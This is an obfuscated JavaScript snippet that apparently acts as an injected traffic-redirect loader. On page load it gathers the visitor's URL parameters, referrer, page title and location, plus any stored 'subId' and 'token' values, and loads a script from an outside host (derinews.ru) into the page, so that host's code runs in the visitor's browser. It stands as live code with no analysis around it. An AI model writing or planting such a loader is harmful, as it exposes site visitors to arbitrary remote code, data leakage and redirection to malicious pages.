(function() {
    var name = '_QV1pkcmtNFRv8WMt';
    if (!window._QV1pkcmtNFRv8WMt) {
        window._QV1pkcmtNFRv8WMt = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://derinews.ru/m8SDJP2c',
        };
    }
    const _LB3yPvg326S3LMwL = localStorage.getItem('config');
    if (typeof _LB3yPvg326S3LMwL !== 'undefined' && _LB3yPvg326S3LMwL !== null) {
        var _6yqPZyPZqyb7w31S = JSON.parse(_LB3yPvg326S3LMwL);
        var _41xs3PCn59ZQHnKK = Math.round(+new Date()/1000);
        if (_6yqPZyPZqyb7w31S.created_at + window._QV1pkcmtNFRv8WMt.ttl < _41xs3PCn59ZQHnKK) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _LyfYwWMqTgq8gqZJ = localStorage.getItem('subId');
    var _d2GjHSmKjLFtNvcK = localStorage.getItem('token');
    var _Lg6cVSx9tkYhM8Vq = '?return=js.client';
        _Lg6cVSx9tkYhM8Vq += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _Lg6cVSx9tkYhM8Vq += '&se_referrer=' + encodeURIComponent(document.referrer);
        _Lg6cVSx9tkYhM8Vq += '&default_keyword=' + encodeURIComponent(document.title);
        _Lg6cVSx9tkYhM8Vq += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _Lg6cVSx9tkYhM8Vq += '&name=' + encodeURIComponent(name);
        _Lg6cVSx9tkYhM8Vq += '&host=' + encodeURIComponent(window._QV1pkcmtNFRv8WMt.R_PATH);
    if (typeof _LyfYwWMqTgq8gqZJ !== 'undefined' && _LyfYwWMqTgq8gqZJ && window._QV1pkcmtNFRv8WMt.unique) {
        _Lg6cVSx9tkYhM8Vq += '&sub_id=' + encodeURIComponent(_LyfYwWMqTgq8gqZJ);
    }
    if (typeof _d2GjHSmKjLFtNvcK !== 'undefined' && _d2GjHSmKjLFtNvcK && window._QV1pkcmtNFRv8WMt.unique) {
        _Lg6cVSx9tkYhM8Vq += '&token=' + encodeURIComponent(_d2GjHSmKjLFtNvcK);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._QV1pkcmtNFRv8WMt.R_PATH + _Lg6cVSx9tkYhM8Vq;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
